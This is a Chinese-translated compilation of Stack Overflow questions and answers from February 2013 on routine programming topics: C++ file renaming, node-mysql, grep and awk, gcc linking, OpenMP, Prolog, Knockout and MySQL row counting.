## 回答 #4

> 赞同：0
> 
> 时间：2013-02-17T00:45:33.720

窗口 -> 显示视图 -> 其他 -> Android -> LogCat

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-20T00:31:43.657

我个人认为 Eclipse 不是观看 logcat 的最佳位置（它已经和默认情况下一样重，而且你在其中投入了更多……）。

所以，我推荐好的旧命令行（Linux）：

```
$ adb logcat -v time 
```

我创建了一个 logcat 着色器来帮助区分重要的东西： [https ://bitbucket.org/brunobraga/logcat-colorize](https://bitbucket.org/brunobraga/logcat-colorize)

# c++ - readdir()：重新读取某些文件

> ID：14916773
> 
> 赞同：1
> 
> 时间：2013-02-17T00:33:27.077
> 
> 标签：c++, readdir, dirent.h

我有一个功能，其任务是重命名文件夹中的所有文件，但是，它重新命名某些文件：http: [//i.imgur.com/JjN8Qb2.png](http://i.imgur.com/JjN8Qb2.png)，同样的“错误”每十个数字就会发生向前。究竟是什么导致了这个“错误”？

该函数的两个参数是文件夹的路径和第一个文件应该具有的起始值。

```
int lookup(std::string path, int *start){
        int number_of_chars;
        std::string old_s, file_format, new_s;
        std::stringstream out;
        DIR *dir;
        struct dirent *ent;

        dir = opendir (path.c_str());
        if (dir != NULL) {
            // Read pass "." and ".."
            ent = readdir(dir);
            ent = readdir(dir);
            // Change name of all the files in the folder
            while((ent = readdir (dir)) != NULL){
                // Old string value
                old_s = path;
                old_s.append(ent->d_name);
                // Get the format of the image
                file_format = ent->d_name;
                number_of_chars = file_format.rfind(".");
                file_format.erase(0,number_of_chars);
                // New string value
                new_s = path;
                out << *start;
                new_s += out.str();
                new_s.append(file_format);
                std::cout << "Successfully changed name on " << ent->d_name << "\tto:\t" << *start << file_format << std::endl;
                // Switch name on the file from old string to new string
                rename(old_s.c_str(), new_s.c_str());

                out.str("");
                *start = *start+1;
            }
            closedir (dir);
        }
        // Couldn't open
        else{
            std::cerr << "\nCouldn't open folder, check admin privileges and/or provided file path\n" << std::endl;
            return 1;
        }

        return 0;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:52:24.000

我看到的可能问题：

*   重命名文件会导致它们被送入您的算法两次。
*   您计算新文件名的算法是错误的。

您应该能够轻松地为此编写测试，这反过来应该可以帮助您解决问题或编写更具体的问题。除此之外，我没有看到任何严重的问题，但如果你稍微缩小变量的范围会有所帮助，这将确保不同的迭代不会相互影响。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:52:55.427

您正在将文件重命名到原始文件所在的同一文件夹，从而导致无限循环。您重命名为`04.png`，`4.png`但由于您正在迭代文件夹中的所有文件，因此在某些时候您将迭代到“新”`4.png`文件（在您的 smaple 中，在第 40 次迭代中）并将该文件重命名为`40.png`等等。 .

**通过对现有代码的最小更改**来解决此问题的最简单方法是将文件“重命名”（移动）到具有新名称的临时文件夹。就像是：

```
new_s = temp_path;
out << *start;
new_s += out.str();
new_s.append(file_format);
// Switch name on the file from old string to new string
rename(old_s.c_str(), new_s.c_str()); 
```

当您完成重命名`path`（`while`循环外）中的所有文件时，删除文件夹并“重命名”（移动）`temp_path`到`path：

```
closedir (dir);
deletedir(path);
rename(temp_path, path); 
```

`

# javascript - 将数据馈送存储为变量

> ID：14916776
> 
> 赞同：0
> 
> 时间：2013-02-17T00:33:49.853
> 
> 标签：javascript, jquery, json

我是 Javascript、JQuery 和 JSON 的新手，我想知道是否可以将来自 RSS 提要的数据提要存储为变量。

例如，我有这段代码从 youtube 接收提要并通过它解析以获取视频 ID。每次通过后，我希望它存储要存储在不同变量中的数据。

代码如下。

```
$(document).ready(function () {
 getYouTubeAllInfo();
 });    

function getYouTubeAllInfo() {
       $.getJSON('http://gdata.youtube.com/feeds/users/SkyDoesMinecraft/uploads?orderby=updated&alt=json-in-script&callback=?&start-index=1&max-results=15', 
   function(data){
       $.each(data.feed.entry, function(i, item){
           var id = item['id']['$t'];
           id = id.replace("http://gdata.youtube.com/feeds/videos/","");
       });
   }); 
   } 
```

您可以在此处查看实时版本：[Jsfiddle](http://jsfiddle.net/Xemgz/14/)有一个追加到 div 以向您展示它的作用。

但我需要它做的是将一次迭代保存到一个变量，然后将下一次保存到另一个变量。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:37:15.580

您可以将其存储为数组：

```
var feedIds = [];
function getYouTubeAllInfo() {
   $.getJSON('http://gdata.youtube.com/feeds/users/SkyDoesMinecraft/uploads?orderby=updated&alt=json-in-script&callback=?&start-index=1&max-results=15', 
       function(data){
           $.each(data.feed.entry, function(i, item){
               var id = item['id']['$t'];
               id = id.replace("http://gdata.youtube.com/feeds/videos/","");
               feedIds.push(item['id']);
           });
           console.log(feedIds);
   }); 
} 
```

# mysql - Node.js mySQL 模块错误

> ID：14916777
> 
> 赞同：0
> 
> 时间：2013-02-17T00:34:03.393
> 
> 标签：mysql, node.js

使用 Packt 的[Node Cookbook](http://www.packtpub.com/node-to-guide-in-the-art-of-asynchronous-server-side-javascript-cookbook/book)中的 mysql 模块和代码示例。

```
var mysql = require('mysql');
var client = mysql.createClient({
user: 'root',
password: 'sqlpassword',
//debug: true  
});

var ignore = [mysql.ERROR_DB_CREATE_EXISTS,
          mysql.ERROR_TABLE_EXISTS_ERROR];

client.on('error', function (err) {
if (ignore.indexOf(err.number) + 1) { return; }
throw err;
});

client.query('CREATE DATABASE quotes');
client.useDatabase('nodb');
client.query('CREATE TABLE quotes.quotes (' +
         'id INT NOT NULL AUTO_INCREMENT,' +
         'author VARCHAR( 128 ) NOT NULL,' +
         'quote TEXT NOT NULL, PRIMARY KEY (  id )' +
         ')');

client.query('INSERT INTO  quotes.quotes (' +
          'author, quote) ' +
          'VALUES ("Proof by analogy is fraud.", "Bjarne Stroustrup");');

client.end(); 
```

并且该代码返回我错误**对象＃没有方法'useDatabase'**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T03:50:32.590

我相信您想在连接时指定数据库。

```
var mysql = require('mysql');
var client = mysql.createClient({
user: 'root',
password: 'sqlpassword',
database: 'nodb'
//debug: true  
});

var ignore = [mysql.ERROR_DB_CREATE_EXISTS,
          mysql.ERROR_TABLE_EXISTS_ERROR];

client.on('error', function (err) {
if (ignore.indexOf(err.number) + 1) { return; }
throw err;
});

client.query('CREATE DATABASE quotes');
client.query('CREATE TABLE quotes.quotes (' +
         'id INT NOT NULL AUTO_INCREMENT,' +
         'author VARCHAR( 128 ) NOT NULL,' +
         'quote TEXT NOT NULL, PRIMARY KEY (  id )' +
         ')');

client.query('INSERT INTO  quotes.quotes (' +
          'author, quote) ' +
          'VALUES ("Proof by analogy is fraud.", "Bjarne Stroustrup");');

client.end(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-30T07:39:18.840

将 node-mysql v0.9 示例迁移到 v2.0。[https://github.com/felixge/node-mysql](https://github.com/felixge/node-mysql)

```
var mysql = require('mysql');

var client = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'OURPASSWORD'
  //debug: true
});

var ignore = [mysql.ERROR_DB_CREATE_EXISTS,
              mysql.ERROR_TABLE_EXISTS_ERROR];

client.on('error', function (err) {
  if (ignore.indexOf(err.number) + 1) { return; }
  throw err;
});

client.query('CREATE DATABASE quotes');
client.query('USE quotes');

client.query('CREATE TABLE quotes.quotes (' +
             'id INT NOT NULL AUTO_INCREMENT,' +
             'author VARCHAR( 128 ) NOT NULL,' +
             'quote TEXT NOT NULL, PRIMARY KEY (  id )' +
             ')');

client.query('INSERT INTO  quotes.quotes (' +
              'author, quote) ' +
              'VALUES ("Bjarne Stroustrup", "Proof by analogy is fraud.");');

client.end(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T13:53:20.333

在此模块的最新版本中，与 mySQL 的连接不是由

```
mysql.createClient({}); 
```

但与

```
mysql.createConnection({}); 
```

# grep - 搜索短语的组合

> ID：14916783
> 
> 赞同：1
> 
> 时间：2013-02-17T00:34:32.130
> 
> 标签：grep

使用“grep”在文本文件中搜索模式组合的方法是什么？

比如说，我正在寻找“顺便说一下”和其他可能的组合，例如“顺便说一下”和“顺便说一下”

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T14:20:37.917

awk 是这个工具，而不是 grep。一行：

```
awk '/by/ && /the/ && /way/' file 
```

在整个文件中：

```
gawk -v RS='\0' '/by/ && /the/ && /way/' file 
```

请注意，这是搜索 3 个单词，而不是搜索这 3 个单词之间有空格的组合。那是你要的吗？

如果您需要更多帮助，请提供更多详细信息，包括示例输入和预期输出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T00:54:16.783

The simplest approach is probably by using regexps. But this is also slightly wrong:

```
egrep '([ ]*(by|the|way)\>){3}' 
```

What this does is to match on the group of your three words, taking spaces in front of the words with it (if any) and forcing it to be a complete word (hence the `\>` at the end) and matching the string if any of the words in the group occurs three times.

Example of running it:

```
$ echo -e "the the the\nby the\nby the way\nby the may\nthe way by\nby the thermo\nbypass the thermo" | egrep '([ ]*(by|the|way)\>){3}'
the the the
by the way
the way by 
```

As already said, this procudes a 'false' positive for `the the the` but if you can live with that, I'd recommend doing it this way.

# linux - 如何更改 gcc 在与 /bin/ld 链接时使用的库？

> ID：14916784
> 
> 赞同：1
> 
> 时间：2013-02-17T00:34:34.933
> 
> 标签：linux, gcc, libraries, ld, search-path

我正在尝试使用从另一个系统重新定位的 gcc 版本来编译某些东西。我知道这有问题，但如果我能让它工作，它会让我的生活更轻松。我已将 /opt/transfer/lib 路径添加到 $LIBRARY_PATH 并且 gcc 似乎看到了这一点（来自 gcc -print-search-dirs）。我还添加了 /opt/transfer/lib 到 /etc/ld.so.conf 虽然我非常喜欢不需要这样做的解决方案。当我执行时出现问题：

> g++ -g -m32 chopper.o -Llibs -lRTS -o Chopper /usr/bin/ld: 搜索 /usr/lib/libstdc++.so.6 /usr/ 时跳过不兼容的 /usr/lib/libstdc++.so.6 bin/ld: 找不到 /usr/lib/libstdc++.so.6 /usr/bin/ld: 搜索 /lib/libc.so.6 /usr/bin/ld 时跳过不兼容的 /lib/libc.so.6 : 找不到 /lib/libc.so.6 /usr/bin/ld: 搜索 /usr/lib/libc_nonshared.a 时跳过不兼容的 /usr/lib/libc_nonshared.a /usr/bin/ld: 找不到 /usr /lib/libc_nonshared.a collect2: ld 返回 1 个退出状态

ld 似乎正在 /usr/lib/ 中搜索然后放弃。有一个 /opt/transfer/lib/libstdc++.so.6 文件应该兼容但没有被链接到。如果我运行“gcc -print-file-name=libstdc++.so.6”，它会找到我希望它使用的版本。在这种情况下，有什么方法可以强制 ld 查看另一个目录而不是 /usr/lib 吗？

## 编辑

我尝试按照 nneonneo 的建议使用 --sysroot 选项，但我不确定它是否有效。这个选项在我的 ld 版本中不可用，所以我使用 --with-sysroot=/opt/transfer 和 --with-build-sysroot=/opt/transfer 重新编译。然后，当我运行时，我将其作为示例输出：

> /opt/transfer/bin/ld: 搜索 /usr/lib/libstdc++.so.6 时跳过不兼容的 /usr/lib/libstdc++.so.6 /opt/transfer/bin/ld: 找不到 /usr/lib/ libstdc++.so.6 ld 返回 1 个退出状态

从这个输出来看，我并不是 100% 清楚它正在搜索 /opt/transfer/lib 和 /opt/transfer/usr/lib 目录，因为我相当确定应该存在正确的 libstdc++.so.6 文件. 如果我从 /opt/transfer 中删除这些库，那么它会开始抱怨缺少其他库，因此它显然至少可以部分工作，但是所有这些其他库都只说找不到它们，而对于 libstdc++ 它仍然说它正在跳过一个不兼容的库. libstdc++ 是否有可能被视为特例？是否有另一种选择可以解决这个问题？

## 编辑 2

我只是将系统的 /usr/libstdc++.so.6 移动到备份位置，并且在这样做之后 ld 将不再说它正在跳过不兼容的版本。这绝对意味着 --sysroot 没有做我在这里所期望的。任何人拥有的任何更多信息将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:39:30.427

尝试使用`--sysroot`选项 ( `--sysroot /opt/transfer`)。`--sysroot`是使 GCC（和相关工具）从非标准目录运行的推荐方法，因此它非常适合您重新定位的 GCC。

您将不得不重新组织您的`/opt/transfer`目录以更紧密地匹配源代码分发的布局（即，将库放在`/opt/transfer/usr/lib`. 您可以根据需要将常规目录`/opt/transfer`中 GCC 需要的任何内容符号链接到其中。

# openmp - C中的Openmp线程控制

> ID：14916786
> 
> 赞同：1
> 
> 时间：2013-02-17T00:34:44.117
> 
> 标签：openmp

如果我有一个并行部分代码，是否可以为每个部分分配一个特定线程，即类似的东西

```
#pragma omp sections num_threads(2)
{
   #pragma omp section  //<---assigned to master thread
    {
      //do something
     }
    #pragma omp section  //<---assigned to the other thread
    {
      //do something
     }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-18T14:12:51.953

将 OpenMP 部分分配给线程是以与实现相关的方式完成的。导致特定执行线程的唯一指令是`master`.

如果您确实需要为每个线程提供特定于线程的工作，请在返回值上使用条件`omp_get_thread_num()`：

```
#pragma omp parallel num_threads(2)
{
   switch (omp_get_thread_num())
   {
      case 0:
         // Code for thread 0
         break;
      case 1:
         // Code for thread 1
         break;
      default:
         break;
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-18T05:50:48.687

要分配给主线程，您可以使用

```
#pragma omp master 
```

# servicestack - servicestack request 实现搜索的最佳方法

> ID：14916794
> 
> 赞同：4
> 
> 时间：2013-02-17T00:35:41.643
> 
> 标签：servicestack

你们会推荐什么作为在 servicestack 中实现搜索的最佳方式。例如，目前我有一个高级搜索表单，它在后端只是动态地构建了一个 linq 查询。如果我想使用服务堆栈公开搜索功能，那么最好的方法是什么。

我见过一些人使用创建请求属性的想法，例如 [object].FirstnameStartsWith 、 [object].SurnameContains 等

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-18T16:56:55.567

我带着这样的东西去了

```
[Route("/things", "GET")]
public class ThingList
{
    public string Term { get; set; }
    public int Take { get; set; }
    public int Skip { get; set; }
}

public partial class ThingService : Service
{
     public object Get(ThingList req)
     {
         var query = this.Things // from somewhere

         if(!string.IsNullOrEmpty(req.Term))
             query = query.Where(x => x.Name.Contains(req.Term));

         if(req.Skip > 0) query = query.Skip(req.Skip);
         if(req.Take > 0) query = query.Take(req.Take);

         return query.ToList();
     }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-18T20:29:24.497

没有`best way`为服务设计 API，但您的目标应该是尽可能具有描述性和用户友好性，以便客户可以通过查看请求 DTO 来准确确定服务的功能。

一般来说，服务应该是连贯的并且与使用它们的客户端调用上下文的用例相关，例如，为该请求添加一个新的字段/功能应该有可能对已经使用该服务的现有客户端有用。

搜索和过滤结果集就是一个很好的例子，其中添加的每个字段/功能都在过滤目标结果集。

我在设计服务时的其他顾虑是缓存能力，即我将长期可缓存结果与短期不可缓存信息分开。

# python - 在 Google AppEngine 上下载的最长时间是多少？

> ID：14916797
> 
> 赞同：0
> 
> 时间：2013-02-17T00:36:05.530
> 
> 标签：python, google-app-engine

我想安排在给定时间运行流媒体下载，每次运行大约 20 分钟。AppEngine（Python）可以做到这一点吗？[URL Fetch](https://developers.google.com/appengine/docs/python/urlfetch/overview#Quotas_and_Limits)文档建议限制为 60 秒，但有没有办法在不使用 URL Fetch API 的情况下做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T12:20:23.017

您必须使用后端来执行此操作，因为后端可以无限期地运行，尽管您将使用哪些功能取决于您正在流式传输的内容。

# objective-c - 使用 obj-c 以编程方式检测打印机是否支持双面打印

> ID：14916801
> 
> 赞同：0
> 
> 时间：2013-02-17T00:36:31.923
> 
> 标签：objective-c, printing, duplex

在过去的几天里，我一直被这件事难住了。我需要检测打印机是否支持双面打印。

我使用如下代码取得了部分成功：

```
NSPrinter * printer = [NSPrinter printerWithName:pname];

[printInfo setPrinter:printer];

PMPrintSettings settings = printInfo.PMPrintSettings;
PMDuplexMode pmDuplexMode = 0;
OSStatus status = PMGetDuplex(settings, &pmDuplexMode);
supportsDuplex = (status >= 0); 
```

但这只有在我通过 NSPrintPanel 捕获完整的打印机配置时才有效。我需要一种方法来检测具有特定名称的打印机是否支持双面打印，而无需用户首先打开面板。我想为本地 Mac 上定义的任何打印机做。任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:53:35.687

在您的代码片段中，我怀疑将肯定解释`status`为表示支持是否正确。通常，除零 ( ) 以外的任何值`noErr`都是某种故障。

如果您确信`PMGetDuplex()`当打印机不支持双面打印时会为打印设置对象返回错误，您可以尝试这种方法：使用创建会话`PMCreateSession()`，`PMPrinter`使用`PMPrinterCreateFromPrinterID()`或通过搜索`PMSessionCreatePrinterList()`匹配任何条件的数组返回的数组您想要，使用 设置会话以使用该打印机`PMSessionSetCurrentPMPrinter()`，使用 创建打印设置对象`PMCreatePrintSettings()`，调用`PMSessionDefaultPrintSettings()`以从会话初始化打印设置，调用`PMSessionValidatePrintSettings()`只是为了良好的措施，然后调用`PMGetDuplex()`并检查返回值。

还可能值得尝试设置双工模式`PMSetDuplex()`并检查返回码，并可能调用`PMSessionValidatePrintSettings()`并检查它是否更改了该设置。

# lambda - 在prolog中的谓词内定义谓词

> ID：14916802
> 
> 赞同：7
> 
> 时间：2013-02-17T00:36:36.357
> 
> 标签：lambda, prolog, metaprogramming, predicate

我正在尝试定义一个谓词内联以将其传递给 Prolog 中的另一个谓词。

```
% Test if a "product" of graphs G1 and G2 has a "mini-loop" starting from Q
test_property_combined(G1,G2,Q):-
    (g12(Q1,Q2) :- combine(G1,G2,Q1,Q2)),
    some_property(g12,Q). 
```

*（上面的语法显然是错误的。）*

稍后`g12`将被调用`call`

```
% Test if a graph G has a "mini-loop" starting from Q
some_property(G,Q):-
    Goal1 =.. [G,Q,C],
    Goal2 =.. [G,C,Q],
    call(Goal1),
    call(Goal2). 
```

问题仍然存在，因为我想测试`some_property`某种先前定义的谓词的聚合。

```
% Create a "product" of graphs G1 and G2
combine(G1,G2,(Q1,Q2),(Q3,Q4)):-
    Goal1 =.. [G1,Q1,Q3],
    Goal2 =.. [G2,Q2,Q4],
    call(Goal1),
    call(Goal2). 
```

上述谓词和测试查询示例：

```
% g1 and g2 are graphs
g1(a,b).
g1(b,a).

g2(c,d).
g2(d,c).

?- test_property_combined(g1,g2,(a,c)). 
```

怎么做呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T09:07:26.333

我不确定要明白这一点，但这有效：

```
test_property_combined(G1,G2,Q):-
    assert((g12(Q1,Q2) :- combine(G1,G2,Q1,Q2))),
    some_property(g12,Q). 
```

好的，可能是这样的

```
:- use_module(library(lambda)).

test_property_combined(G1,G2,Q):-
    % (g12(Q1,Q2) :- combine(G1,G2,Q1,Q2)),
    Pred = \Z^T^combine(G1,G2,Z,T),
    some_property(Pred,Q).

combine(G1,G2,(Q1,Q2),(Q3,Q4)):-
    Goal1 =.. [G1,Q1,Q3],
    Goal2 =.. [G2,Q2,Q4],
    call(Goal1),
    call(Goal2).

some_property(G,Q):-
    call(G, Q, C),
    call(G, C, Q). 
```

最后编辑（希望如此）完整代码：

```
test_property_combined(G1,G2,Q):-
    some_property(combine(G1,G2),Q).

combine(G1,G2,(Q1,Q2),(Q3,Q4)):-
    call(G1,Q1,Q3),
    call(G2,Q2,Q4).

some_property(G,Q):-
    call(G, Q, C),
    call(G, C, Q).

g1(a,b).
g1(b,a).

g2(c,d).
g2(d,c). 
```

@false => 有用的评论，像往常一样！

# forms - 从表单接收数据并使用 preg_replace 修改它

> ID：14916803
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:36:42.113
> 
> 标签：forms, preg-replace

我有以下 HTML 代码：

```
 <form method="post" action="">
    <b>Name: <input type="text" name="username" size="20" />
    <input type="submit" value="Login" name="login" />
    </form> 
```

和：

```
 <?php
    if(isset($_POST['login'])){
    $check = $_POST['username'];
    ?> 
```

每当用户提交他的用户名时，用户应该会收到他的用户名，但需要进行以下修改：

1) *空间条将替换为“_”

2) *所有字母将变为非大写字母。

示例：用户名：“我喜欢冰淇淋”

结果：i_like_icecream

该消息应通过回显作为变量显示给用户。

```
 echo "$result"; 
```

我正在考虑用 preg_repalce 来做这件事，但由于我对它不太熟悉，所以并没有真正做到。任何帮助都会得到帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:10:24.673

preg_replace() 太强大了，但是对于这个任务来说太贵了。您需要更改的模式是恒定的，因此您最好使用 str_replace() 和 mb_strtolower()

```
$encoding = 'UTF-8';                     // optional
$name = $_POST['usernamename']         
$name = str_replace(' ', '_', $name);  
$name = mb_strtolower($name, $encoding); // or $name = mb_strtolower($name); if you don't specify encoding 
```

# javascript - 使用带有 Knockout 和 Asp.net MVC4 的显示模块模式

> ID：14916807
> 
> 赞同：0
> 
> 时间：2013-02-17T00:37:30.377
> 
> 标签：javascript, jquery, asp.net-mvc-4, knockout.js, knockout-2.0

我正在尝试将淘汰赛与我的 asp.net mvc 4 应用程序一起使用。这就是我的代码的样子。

```
 <script>

var my = my || {}; //creating private namespace to avoid any conflicts other namespaces: my namespace

$(document).ready(function () {

    ////////////////view model testing////////////////////////////

    // Define Main ViewModel; javascript Object Literals
    ////it is a workaround for moduler JS pattern including revealing js pattren 
    ///it also uses KnockOut. end product ViewModel; 

    function teammemberModel() {
        this.Id = ko.observable();
        this.Title = ko.observable();
        this.Name = ko.observable();
        this.Email = ko.observable();
        this.Nationality = ko.observable();
        this.Sex = ko.observable();

    };

    my.viewModel = function () {

        var teamMembers = ko.observableArray([]),

            loadTeamMembers = function (projectId) {                
                $.ajax({
                    type: "GET",
                    url: "/Project/GetTeamMembers?projectId=" + projectId,

                    success: function (response) {

                        my.viewModel.teamMembers.removeAll();
                        $.each(response.results, function (x, team) {
                            my.viewModel.teamMembers.push(new teammemberModel()
                                .Id(team.Id)
                                .Title(team.Title)
                                .Name(team.UserName)
                                .Email(team.Email)
                                .Nationality(team.Nationality)
                                .Sex(team.Sex)

                            );

                        });
                    }                        
                });
            }
        return {
            teamMembers: teamMembers,
            loadTeamMembers: loadTeamMembers
        };
    } ();

    //Applies KO bindings        
    ko.applyBindings(my.viewModel);
    my.viewModel.loadTeamMembers(6);

    ///////////////////////////////////////////////////       

    });    
    </script> 
```

这是我的客户端 Knockout 基本视图模型的示例模块化 JS 实现。我的观点如下所示。

```
 <table >    
    <thead>
    <tr>

        <th>Title</th>
        <th>Description</th>
        <th>Status</th>
        <th>Created By</th>
        <th>Created Date</th>
    </tr>
</thead>    
<tbody data-bind="foreach: teamMembers">

    <tr>                            
        <td data-bind="text: UserName"></td>
        <td data-bind="text: Email"></td>
        <td data-bind="text: Sex"></td>
        <td data-bind="text: Title"></td>
        <td data-bind="text: Nationality"></td>

    </tr>                        

      </tbody>
    </table> 
```

我可以在我的 ajax 调用中看到 json 数据被推送到 teamMembers ko.observableArray 中。此代码应该按照我尝试遵循的教程工作，但我没有在我的表中显示我的任何数据。有人可以指导我这段代码有什么问题以及为什么我的表格没有在这里呈现。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:32:11.833

您的客户端代码看起来不错可能是您的服务器端代码有问题。检查您从服务器返回的内容，尤其是响应变量中返回的数据。

我认为 response.result 没有任何数据，这就是您遇到异常的原因。所以请调试您的客户端代码。

```
$.each(response.results, function (x, team) {} 
```

# matlab - 为 Atlassian Fisheye/Crucible 定义自定义语法突出显示：MATLAB

> ID：14916809
> 
> 赞同：0
> 
> 时间：2013-02-17T00:37:40.807
> 
> 标签：matlab, syntax-highlighting

我正在使用 Atlassian Fisheye/Crucible（“fecru”）进行 MATLAB 代码审查，而 fecru 显然缺少对 matlab 代码的语法方案支持。显然有一种机制可以支持用户定义的方案，只需将其放入文件夹*syntax/..*并在*filename.map*中注册（另见[此处](https://confluence.atlassian.com/display/FISHKB/Defining+your+own+syntax+highlighting+in+Crucible+or+Fisheye)）。

也许有人已经实现**了 matlab.def**文件？如果你能分享它，将不胜感激。

现在我最好的起点是**java.def**。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T02:22:08.250

我能够生成一个稍微修改的**python.def**以突出显示 fecru 的 jsp 端的 MATLAB 语法：

将[其](https://gist.github.com/ewiger/4969758)放入**matlab.def**

```
syntaxdef matlab {
 ...
} 
```

并将其链接到**filename.map**

```
"**/*.m" matlab.def "MATLAB" 
```

确保它不与

```
# "**/*.m" objc.def "Objective C" 
```

您必须重新启动 fecru 才能进行更改。

# python - pydev 中的控制台不再报告我的脚本中的错误

> ID：14916810
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:37:52.877
> 
> 标签：python, eclipse, pydev

我正在使用 pydev 编写一些简单的脚本。不幸的是，控制台停止在我的脚本中显示错误。有谁知道可能是什么问题？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:55:21.140

Found the solution: restart my OS. (I am running CentosOS 6.3). I felt I was using Windows 10 years ago. Where is the world going !?

Maybe somebody wants to pick up this bug, unfortunately, I have no logs.

Thanks to the community anyway,

# c++ - 这个 C++ 引用赋值正确吗？

> ID：14916811
> 
> 赞同：2
> 
> 时间：2013-02-17T00:37:57.700
> 
> 标签：c++, reference, variable-assignment

在这个简化的示例中，我的问题是：我是否在 Action::setUser() 中进行了合法分配？

```
class User {
private:
   int age;
public:
   int getAge() { return age; }
};

class Action {
private:
   User user;
public:
   void setUser(User &u) {
      user = u;
   }
};

int main() {
   User u;
   Action a;
   a.setUser(u);
   return 0;
} 
```

让我吵闹的是，

*   调用 setUser 时，Action 的“用户”属性会发生什么变化？它被摧毁了吗？它曾经建造过吗？
*   如果我第二次调用 setUser 会发生什么？
*   如果我删除 setUser 中的“&”符号，一切都会好起来的，对吧？因为这就像传递参数的副本，对吗？

我担心我在用记忆做疯狂的事情，因为属性没有被正确地破坏......

谢谢

* * *

**于 2013 年 2 月 18 日星期一编辑**

非常感谢！我真的很感谢你所有的回应......

我不知道编译器提供了默认的重载赋值运算符。现在我知道一切都说得通了……

再次感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T00:42:33.113

> 调用 setUser 时，Action 的“用户”属性会发生什么变化？

*调用赋值运算符*（由编译器提供，因为您尚未定义自定义运算符），它只是执行从`u`to的成员方式复制`user`。

> 它被摧毁了吗？

不。

> 它曾经建造过吗？

是的。

> 如果我第二次调用 setUser 会发生什么？

一样的东西。

> 如果我删除 setUser 中的“&”符号，一切都会好起来的，对吧？

就分配到`user`而言，这没有什么区别。通过引用传递只是意味着在调用函数时不会复制参数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T00:43:21.070

是的，没关系。它只是将`u`您在 main 中定义的直接分配给`a.user`. 引用参数避免制作额外的副本以传递给`a.setUser`.

当您创建它时，`Action`它包含一个默认构造的`User`对象。然后，您将为其分配一个值`User`。这不是（IMO）最好的设计（我宁愿看到`User`具有正确值的构造），但它完全有效。

赋值不会创建或破坏现有值。当`Action`对象超出范围时将被销毁，这将销毁`User`它包含的对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-17T00:44:12.893

答案：

*   它没有被破坏，而是被覆盖（复制分配）。是的，它是以前建造的。
*   和第一次一样。
*   如果您删除了`&`，您将传递一个副本。它不会使事情变得错误或正确。

笔记：

*   在成员函数和传递的参数上都使用 const。
*   您至少需要考虑控制复制和分配。这应该在任何更好的 C++ 介绍或常见问题解答中解释。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-17T00:44:51.583

```
class Action {
private:
   User user;
} 
```

定义类型的私有成员`User`。它是一个具有自动存储持续时间的对象，它是在构造类型对象时`Action`构造的。它的生命周期与 type 对象的生命周期相关`Action`。

现在在这个方法中：

```
void setUser(User &u) {
    user = u;
} 
```

`u`是对其属性（成员）的对象的引用，该对象的属性（成员）将用于`user`通过***赋值运算符***设置 的属性。

如果你`&`在此处删除，你将通过引用传递更改为按值传递，这意味着传递给此方法的对象副本将在其调用时创建。

# c++ - 如何从变量中创建包含多个元素的数组？

> ID：14916812
> 
> 赞同：0
> 
> 时间：2013-02-17T00:38:14.217
> 
> 标签：c++, arrays

我有一个`num`从文件中读取的整数。我想创建一个元素数量为 的数组`num`。

我想做但不起作用的示例代码：

```
int num;
cin >> num;
int iarray[num]; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T00:45:39.197

C++ 中的数组具有编译时界限。

请改用动态分配，或`std::vector`围绕同一进程使用健康的包装器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T00:59:43.657

动态分配是`int * iarray = new int[num];`

只要确保`delete[] iarray;`在某个时候调用以释放内存即可。

# mysql - 检查 MySQL 中的查询是否至少有 2 行

> ID：14916814
> 
> 赞同：2
> 
> 时间：2013-02-17T00:38:24.780
> 
> 标签：mysql

对于给定的条件，是否有更好的方法来检查表中是否至少有两行？

请看这个PHP代码：

```
$result = mysql_query("SELECT COUNT(*) FROM table WHERE .......");
$has_2_rows = (mysql_result($result, 0) >= 2); 
```

我不喜欢这个的原因是因为我假设 MySQL 将获取并计算所有匹配的行，这对于大型结果可能会很慢。

我想知道当找到两行时MySQL是否会停止并返回“1”或true。最后会有`LIMIT 2`帮助吗？

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T00:42:55.593

这是一个很好的问题，是的，即使对于大型表，也有一种方法可以使其非常有效。

使用此查询：

```
SELECT count(*) FROM (
    SELECT 1
    FROM table
    WHERE .......
    LIMIT 2
) x 
```

所有的工作都由内部查询完成，当它获得 2 行时停止。还要注意`select 1`，它可以让您提高一点效率，因为它不必从列中检索任何值 - 只是常量`1`。

外部`count(*)`将最多计为 2 行。

